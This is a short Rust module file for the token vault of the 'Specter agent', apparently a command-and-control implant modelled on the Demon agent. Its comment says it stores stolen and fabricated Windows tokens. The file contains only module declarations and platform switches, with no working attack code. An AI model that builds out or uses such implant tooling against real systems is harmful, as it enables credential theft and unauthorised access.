//! Token vault for the Specter agent.
//!
//! Maintains an in-memory collection of stolen and fabricated Windows tokens,
//! mirroring the Demon agent's `Instance->Tokens` vault.  On Windows the vault
//! holds real `HANDLE` values; on other platforms a lightweight stub is provided
//! so the command handlers can compile and return appropriate error responses.

pub mod types;
pub mod vault;

pub use types::{FoundToken, MakeCredentials, TokenEntry, TokenType};
pub use vault::TokenVault;

#[cfg(windows)]
#[allow(unsafe_code)]
#[path = "native_windows.rs"]
pub mod native;

#[cfg(not(windows))]
#[path = "native_stub.rs"]
pub mod native;

#[cfg(test)]
#[path = "../token_tests.rs"]
mod tests;
